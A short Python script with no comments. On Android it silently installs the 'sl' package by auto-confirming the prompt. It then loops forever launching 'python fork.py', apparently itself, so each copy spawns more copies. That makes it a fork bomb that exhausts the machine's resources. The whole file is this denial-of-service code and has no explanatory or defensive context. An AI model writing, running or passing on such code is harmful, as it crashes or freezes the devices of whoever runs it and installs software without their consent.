import os
import platform
if platform.system() == "Android":
  os.system("yes | pkg install sl")
else:
  pass
while True:
  os.system("python fork.py")
